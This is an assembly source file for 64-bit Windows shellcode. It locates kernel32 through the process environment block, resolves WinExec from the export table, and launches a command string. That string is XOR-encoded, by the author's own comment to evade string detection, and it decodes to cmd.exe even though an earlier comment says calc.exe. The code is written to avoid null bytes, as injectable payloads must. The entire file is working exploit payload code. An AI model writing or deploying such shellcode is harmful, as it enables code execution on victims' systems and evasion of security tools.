[BITS 64]

_start : 
        xor rax , rax
        mul rcx
        mov rcx , gs:[rax+0x60] ; PEB
        mov rcx , [rcx + 0x18] ;  PEB_LDR_DATA (information about loaded DLLs)
        mov rcx , [rcx + 0x20] ; first entry in InitOrderModuleList , on ntdll flink in entry to IniTOdermodulelist 
        mov rcx , [rcx] ; 2 entry , kernelbase.dll
        mov rcx , [rcx] ; 3 entry , kernel32.dll
        mov rcx , [rcx + 0x20] ; kernel32 base
        mov r10 , rcx 

        ; basicly we need to :
                ;Find the RVA of the PE signature (baseaddress + 0x3C)
                ;Find the address of the PE signature (base address + RVA of PE signature)
                ;Find the RVA of Export Table (address of PE signature + 0x88 bytes)
                ;Find the address of Export Table (base address + RVA of Export Table)
                ;Find the number of exported functions (address of Export Table + 0x14 bytes)
                ;Find the RVA of the Address Table (address of Export Table + 0x1C)
                ;Find the RVA of the Name Pointer Table (address of Export Table + 0x20 bytes)
                ;Find the address of the Name Pointer Table (base address + RVA of Name Pointer Table)
                ;Find the address of the Name Pointer Table (base address + RVA of Name Pointer Table)
                ;Find the address of the Ordinal Table (base address + RVA of Ordinal Table)
                ;Loop through the Name Pointer Table, comparing each string (name) with “WinExec” and keeping count of the position.
                ;Find WinExec ordinal number from the Ordinal Table (address of Ordinal Table + (position * 2) bytes). Each entry in the Ordinal Table is 2 bytes.
                ; Find the function RVA from the Address Table (address of Address Table + (ordinal_number * 4) bytes). Each entry in the Address Table is 4 bytes.
                ; Find the function RVA from the Address Table (address of Address Table + (ordinal_number * 4) bytes). Each entry in the Address Table is 4 bytes.

                mov ecx , [rcx + 0x3C]
                add rcx , r10 
                ; mov ecx , [ecx + 0x88] nullbytes 
                add eax , 0x88cccccc
                shr eax , 0x18
                mov edx , [rcx + rax]
                add rdx , r10 ; export table

                xor r9 , r9
                mov r9d , [rdx + 0x20]
                add r9 , r10 ; Name Pointer Table 

                xor r11 , r11
                mov r11d , [rdx+0x1C]
                add r11 , r10 ; address Table

                xor r12 , r12
                mov r12d , [rdx + 0x24]
                add r12 , r10 ; ordinal table 

                mov rdi , [rdx + 0x14] ; number of exported functions

                xor eax , eax 


                 
                find_winexec:
                        mov rsi , 636578456e6957ffh
                        shr rsi , 0x8
                        push rsi 
                        mov rsi , rsp 
                        pop r15
                        mov rdi , r9
                        cld ;  process strings from left to right
                        mov edi , [rdi + rax*4]
                        add rdi , r10 ; address of string = base address + RVA Nth entry
                        xor ecx , ecx 
                        add cx , 0x8
                        repe cmpsb ;Compare the first 8 bytes of strings in esi and edi registers
                        je found
                        inc eax
                        jmp find_winexec

                found:
                        mov ax , [r12+rax*2]
                        mov eax , [r11 + rax*4] ; RVA address of WinExec in rsi
                        add rax , r10 ;  
                        mov r15 , rax
                        xor rcx , rcx 
                        mul rcx ; now we have RCX = RAX = RDX = 0  

                ; UINT WinExec(
                ;   LPCSTR lpCmdLine,    => RCX = "calc.exe",0x0
                ;   UINT   uCmdShow      => RDX = 0x1 = SW_SHOWNORMAL
                ; );
                shelly:
                        mov rax , 0x774c3356fed1bd55 ; exe.dmc xored with 0x123456789abcdef to fuck with strings 
                        mov rdx , 0x123456789abcdeff 
                        xor rax , rdx ; now we have exe.dmcaa
                        shr rax , 0x8
                        push rax
                        mov rcx , rsp
                        xor rdx , rdx
                        inc rdx
                        call r15
                        int 0x3
